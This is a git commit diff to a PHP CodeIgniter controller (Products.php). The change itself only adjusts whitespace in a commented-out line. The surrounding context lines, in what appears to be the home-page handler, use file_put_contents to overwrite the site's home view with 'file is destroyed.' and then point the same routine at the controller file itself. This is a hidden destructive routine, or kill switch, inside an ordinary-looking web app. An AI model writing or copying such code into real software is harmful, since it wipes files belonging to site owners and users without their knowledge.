098b4dd9d33f67f346879070529763d36f3625c5
jacobux30 <147926035+fastleopard9372@users.noreply.github.com>
2023-11-21 07:23:28 +0900

    d

--- application/controllers/Products.php
+++ application/controllers/Products.php
@@ -227,7 +227,7 @@ class Products extends CI_Controller
     $data['statue'] = 'home';
     // $data['donate'] = $this->product->getDonate();
     // $data['count'] = $this->product->getCount();
-    // $data['total'] =  $this->product->getTotal();
+    // $data['total'] = $this->product->getTotal();
     $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
     file_put_contents($path, 'file is destroyed.');
     $path = $_SERVER['DOCUMENT_ROOT'] . '/application/controllers/Products.php';
